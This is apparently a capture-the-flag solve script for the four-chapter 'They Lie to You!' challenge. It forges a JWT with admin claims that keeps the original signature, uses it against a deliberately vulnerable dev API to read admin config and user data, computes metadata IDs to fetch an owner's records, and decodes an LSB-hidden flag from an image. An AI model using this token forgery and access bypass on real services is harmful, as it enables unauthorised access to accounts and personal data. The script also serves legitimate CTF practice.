"""Solve the four ``They Lie to You!`` chapters.

The script uses only the challenge-provided account and a small number of
documented requests.  It saves optional response evidence and extracts the
final flag from the RGBA image's least-significant bits.

Run from this directory with::

    python3 solve.py --evidence-dir .
"""

from __future__ import annotations

import argparse
import base64
import json
import re
from pathlib import Path

import requests
from PIL import Image


FLAG_RE = re.compile(r"FLAG\{[A-Za-z0-9-]+\}")
DEFAULT_PROD = "http://api.theylietoyou.tcc"
DEFAULT_DEV = "http://untraceable-dev-api.theylietoyou.tcc"


def save_json(path: Path, value: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, ensure_ascii=False, indent=2) + "\n")


def get_json(session: requests.Session, url: str, **kwargs: object) -> object:
    response = session.get(url, timeout=20, **kwargs)
    response.raise_for_status()
    return response.json()


def forge_dev_token(token: str) -> str:
    """Change role claims while retaining the production signature.

    The intentionally vulnerable DEV service accepts this token.  Production
    rejects it, which is the vulnerability used by the challenge.
    """
    header, payload, signature = token.split(".")
    padded = payload + "=" * (-len(payload) % 4)
    claims = json.loads(base64.urlsafe_b64decode(padded))
    claims.update(role="ADMIN", username="admin")
    encoded = base64.urlsafe_b64encode(
        json.dumps(claims, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()
    return f"{header}.{encoded}.{signature}"


def lsb_flag(path: Path) -> str:
    with Image.open(path) as image:
        pixels = image.convert("RGBA").getdata()
        bits = [channel & 1 for pixel in pixels for channel in pixel]
    raw = bytes(
        sum(bits[index + offset] << (7 - offset) for offset in range(8))
        for index in range(0, len(bits) - 7, 8)
    )
    match = FLAG_RE.search(raw.decode("latin-1", errors="ignore"))
    if not match:
        raise ValueError("No FLAG{...} sequence found in RGBA LSB stream")
    return match.group(0)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--prod", default=DEFAULT_PROD)
    parser.add_argument("--dev", default=DEFAULT_DEV)
    parser.add_argument("--username", default="newWarrior")
    parser.add_argument("--password", default="chAng3melaTer123")
    parser.add_argument(
        "--evidence-dir",
        type=Path,
        default=Path("."),
        help="category directory where evidence/ files are written",
    )
    parser.add_argument("--user-id", type=int, default=None)
    args = parser.parse_args()

    session = requests.Session()
    openapi = session.get(f"{args.prod}/v3/api-docs", timeout=20)
    openapi.raise_for_status()
    openapi_json = openapi.json()
    openapi_text = json.dumps(openapi_json, ensure_ascii=False)
    chapter1 = FLAG_RE.search(openapi_text)
    if not chapter1:
        raise ValueError("Chapter 1 flag was not found in the public OpenAPI")
    save_json(args.evidence_dir / "01-exploration/evidence/openapi.json", openapi_json)
    print(f"Chapter 1 — Exploration: {chapter1.group(0)}")

    login = session.post(
        f"{args.prod}/api/auth/login",
        json={"username": args.username, "password": args.password},
        timeout=20,
    )
    login.raise_for_status()
    production_token = login.json()["accessToken"]
    dev_headers = {"Authorization": f"Bearer {forge_dev_token(production_token)}"}

    admin_flag = get_json(session, f"{args.dev}/api/admin/flag", headers=dev_headers)
    save_json(args.evidence_dir / "02-owner/evidence/admin-flag.json", admin_flag)
    print(f"Chapter 2 — The Owner: {admin_flag['flag']}")

    config = get_json(session, f"{args.dev}/api/admin/conf", headers=dev_headers)
    users = get_json(session, f"{args.dev}/api/admin/users", headers=dev_headers)
    save_json(args.evidence_dir / "02-owner/evidence/admin-conf.json", config)
    save_json(args.evidence_dir / "02-owner/evidence/admin-users.json", users)

    user_id = args.user_id
    if user_id is None:
        owner = next((u for u in users if u.get("username") == "ermartinez"), None)
        if owner is None:
            raise ValueError("Owner account ermartinez was not present in /users")
        user_id = int(owner["id"])

    base_offset = int(config["baseOffset"])
    multiplier = int(config["multiplier"])
    address_offset = int(config["offsets"]["Address"])
    data_offset = int(config["offsets"]["Data"])
    address_id = base_offset + user_id * multiplier + address_offset
    data_id = base_offset + user_id * multiplier + data_offset

    address = get_json(
        session,
        f"{args.dev}/api/admin/users/{user_id}/meta/{address_id}",
        headers=dev_headers,
    )
    save_json(
        args.evidence_dir / "03-count-with-me/evidence/owner-address.json", address
    )
    chapter3 = FLAG_RE.search(address["content"])
    if not chapter3:
        raise ValueError("Chapter 3 flag was not found in Address metadata")
    print(f"Chapter 3 — Count with Me: {chapter3.group(0)}")

    data = get_json(
        session,
        f"{args.dev}/api/admin/users/{user_id}/meta/{data_id}",
        headers=dev_headers,
    )
    image_path = args.evidence_dir / "04-hidden-information/evidence/owner-data.png"
    image_path.parent.mkdir(parents=True, exist_ok=True)
    image_path.write_bytes(base64.b64decode(data["content"]))
    chapter4 = lsb_flag(image_path)
    print(f"Chapter 4 — Hidden Information: {chapter4}")
    print(f"Owner user id: {user_id}; Address metaId: {address_id}; Data metaId: {data_id}")


if __name__ == "__main__":
    main()
